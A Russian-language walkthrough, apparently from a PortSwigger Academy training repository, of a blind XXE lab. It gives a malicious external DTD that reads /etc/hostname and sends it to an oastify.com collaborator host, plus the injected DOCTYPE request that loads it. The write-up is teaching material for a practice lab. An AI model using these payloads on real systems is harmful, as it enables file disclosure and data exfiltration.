перейдем по кнопке `go to exploit server`
и заполним поля следующим образом
```
/exploit.dtd
...
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://gqa5gpw2lwm4oi6wi9ndsrvn2e85wvkk.oastify.com/?x=%file;'>">
%eval;
%exfil;

```
и нажмем `store`
и получим ссылку, по которой доступен наш пэйлоад
```
https://exploit-0a34009904fa89f782fe389f01f90048.exploit-server.net/exploit.dtd
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/5.%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/pics%20for%20walktrough/1.png)
перейдем на случайный товар и проверим его наличие кнопкой `Check stock`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/5.%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/pics%20for%20walktrough/2.png)
Перейдем в `Proxy` -> `HTTP history` и найдем данный запрос
```
POST /product/stock 
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/5.%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/pics%20for%20walktrough/3.png)
Добавим в запрос `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a34009904fa89f782fe389f01f90048.exploit-server.net/exploit.dtd"> %xxe;]>`
получив в итоге запрос
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a34009904fa89f782fe389f01f90048.exploit-server.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/5.%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/pics%20for%20walktrough/4.png)
Хоть мы и получаем 400 ошибку, но отстук на домен все же произошел
в коллабораторе найдем хттп квери в которой и будет отстук
```
GET /?x=b38137f4c8af
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/5.%20Exploiting%20blind%20XXE%20to%20exfiltrate%20data%20using%20a%20malicious%20external%20DTD/pics%20for%20walktrough/6.png)
Сдадим `b38137f4c8af` в качестве ответа, и получим уведомление об успешно выполненной лабораторной работе
